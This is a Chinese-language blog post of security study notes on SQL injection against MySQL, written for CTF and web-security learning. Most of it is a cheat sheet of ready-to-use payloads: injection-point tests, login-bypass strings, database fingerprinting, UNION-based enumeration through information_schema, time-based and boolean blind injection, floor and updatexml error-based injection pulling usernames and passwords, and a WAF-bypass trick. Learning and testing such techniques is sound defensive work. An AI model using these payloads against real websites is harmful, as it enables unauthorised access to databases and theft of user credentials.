---
layout:     post
title:      Web知识笔记之SQL注入（MySQL）
subtitle:   这个系列是重新整理安全的学习笔记，包括Web和PWN的一些基础知识。本章是MySQL数据库的SQL注入。
date:       2020-11-26
author:     HouKC
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
	- 学习笔记
	- SQL注入
	- MySQL
---



## 0x00 SQL注入简介

SQL注入就是通过把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。

SQL注入发生位置可以是HTTP数据包中的任意位置。

为了方便说明，所有示例都用`http://www.xxx.com/1.php?id=1`作为注入点，id=1可能为字符型也可能为数值型，视具体情况而定。



## 0x01 判断有无注入点

```
id=1 and 1=1 --  		# 页面响应与正常请求一样
id=1 and 1=2 --  		# 页面返回异常信息出错
```
以上两种情况都存在，基本判断存在SQL注入漏洞。

下面是一些**万能密码**：

```
id=1' or 'a'='a			# 最后面直接与sql语句的分号闭合，就不需要注释符，以此判断为字符型注入
id=1' or 1=1 #			# 井号注释，可以判断为mysql数据库
id=1' or 1=1 -- 		# -- 或--+注释，MySQL或Mssql都可以，有时候也不能用
id=1' or 1=1;--			# ;--注释，可以判断为Mssql数据库
```



## 0x02 判断数据库类型

SQL Server、Oracle以及MySQL的字符串连接符各不相同，利用这一点不同可以用来识别各自的SQL注入漏洞。向Web服务器发送下面两个请求：

- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为SQL Server。

```
id=jack
id=ja'+'ck
```

- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为ORACLE。

```
id=jack
id=ja'||'ck
```

- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为MYSQL。

```
id=jack
id=ja''ck
```



## 0x03 简单暴露

在注入点处插入以下payload测试

```
id=1' or 1=1 -- 
id=-1' union select 1  -- 
id=-1' union select 1, 2 -- 
id=-1' union select 1, 2, 3 -- 
id=-1' order by 3 -- 
...... 
```

注意：

- \' 号前用1或者其他的，也可以置空，视注入语句需要的情况而定，如果是需要前面为真，则需要id等于一个存在的值，如果是要假，则找一个不存在的值即可。

- 最后面的“\-\- ”(注意有空格)是用来注释的，也可以用“\-\-\+”或“\#”。

上面这些是用来测试使用了多少个字段，知道了字段数之后可以进行的数据库信息查询。

```
id=-1' union select 1, database() -- 		# 输出当前数据库名
id=-1' union select 1, user() -- 			# 输出当前用户名
id=-1' union select 1, version() -- 		# 输出数据库版本信息
```
如果需要输出的字段比原来输出的少，可以用下面这句进行拼接输出，利用concat或group_concat函数进行拼接。
```
id=-1' union select username, concat("passwd, user_id, age") -- 
```



## 0x04 information_schema查询

在MySQL 5.0以上就有information_schema库，记录所有数据库名、表名和列名信息，因此可以利用该内置库查询信息，乃至脱库。

```
id=-1' union select schema_name from information_schema.schemata --     # 查看数据库名
id=-1' union select table_schema, table_name from information_schema.tables --   # 查看表名
id=-1' union select table_schema, column_name from information_schema.columns where schema_name='[库名]' and table_name='[表名]' --  # 查找列名
id=-1' union select group_concat(table_name) from information_schema.tables where table_schema = '[库名]' --    # 列举某个数据库下的所有表名
id=-1' union select group_concat(column_name) from information_schema.columns where table_name = '[表名]' --   # 列举某个表下的所有列名
id=-1' union select [列名] from [表名] --     # 直接就用select查询数据
```



## 0x05 盲注

盲注是注入攻击的一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果，这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。

1. 基于时间的盲注

```
id=1' and if(ascii(substr(database(),1,1))<N, sleep(3), 1) -- 
id=1' and if(ascii(substr(database(),1,1))>N, sleep(3), 1) -- 
id=1' and if(ascii(substr(database(),1,1))=N, sleep(3), 1) -- 
```

当数据库名第一个字母的ascii码小于、大于或等于N时，执行一次sleep(3)函数等待3秒，依据响应的时间，可以判断执行成功或失败，进而逐步找出字符并拼接形成数据库名。

将database()函数替换成其他注入语句就可以进行其他查询。

另外还有其他时间盲注方法：

```
id=1' and (select if(length(database())>N, sleep(5), null) -- 				# 当前数据库名长度大于N时，延时5秒
id=-1' or (length(database()))>N or if(1=1, sleep(5), null) or '1'='1		# 当前数据库名长度大于N时，不延时，反之延时5秒
```



2. 基于布尔的盲注

```
id=1' and length(database()) -- 
id=1' and substr(database(), 1, 1) -- 
id=1' and ascii(substr(database(), 0, 1)) -- 
id=1' and ascii(substr(database(), 0, 1))>N -- 
id=1' and ascii(substr(database(), 0, 1))=N -- 
id=1' and ascii(substr(database(), 0, 1))<N -- 
```

原理同时间盲注，就看正常输出还是页面异常。



## 0x06 **报错注入**

#### 1. floor报错注入

报错注入形式上是两个嵌套的查询，即select...(select...)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及函数：

- rand()随机函数，返回0~1之间的某个值。
- floor(a)取整函数，返回小于等于a，且值最接近a的一个整数。
- count()聚合函数也称作计数函数，返回查询对象的总数。
- group by clause分组语句，按照查询结果分组。
- floor(rand(0)\*2)是定性的011011，并不是真随机，而是伪随机，这句会引起报错，从而配合其它语句输出报错信息来达到泄露。
- ()x 是对括号内容的命名，把括号里面的命名为x。

下述中security为数据库名称，security.users为表名，0x3a是英文冒号，这里用来分隔输出，看起来方便点。

获取数据库
```
0' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- 
```

获取表名
```
0' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- 
```

获取用户信息
```
0' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- 
```

#### 2. updatexml报错注入

updatexml(xml_document, xpath_string, new_value)

- 第一个参数：XML文档对象名称（可以用数字代替）

- 第二个参数：XPath字符串（一般就是让这个参数部位正则字符串引起报错）

- 第三个参数：替换查找到的符合条件的数据

```
id=1' and updatexml(1, concat(0x7e, version(), 0x7e),1) -- 
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1)  -- 	# 查找第一个数据库
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 1,1),0x7e),1)  --		# 查找第二个数据库，以此类推
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1),0x7e),1)  --		# 依次查找表名
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1),0x7e),1)  --		# 依次查找列名

# 一次查出所有表名
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) FROM information_schema.tables where table_schema='[库名]'),0x7e),1)  -- 
# 一次查找某个表下所有列名
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) FROM information_schema.columns where table_name='[表名]'),0x7e),1) -- 

```

其中：

- distinct表示返回后面的内容不重复。
- 0x7e为波浪线，用于分隔。

update注入就常用updatexml函数来注入：

```
id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- 
```





## 0xfe 绕过

1. 内联注释

   select * from [table] where id=1 /* hello */ and 1;随便写的一句，内联注释通常可以绕过WAF。



## 0xff 其他小技巧

1. 辅助字符帮助查看
`select * from information_schema limit 20\G;`
limit 20 是限制了只取20条记录，\\G转化成容易看的形式。